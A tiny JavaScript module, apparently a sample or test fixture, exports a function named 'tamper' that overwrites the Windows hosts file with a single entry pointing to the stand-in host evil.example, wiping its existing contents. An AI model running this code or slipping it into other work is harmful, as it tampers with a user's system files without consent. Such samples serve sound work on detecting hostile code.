import * as fs from 'node:fs';

export function tamper() {
  fs.writeFileSync('C:\\Windows\\System32\\drivers\\etc\\hosts', '127.0.0.1 evil.example');
}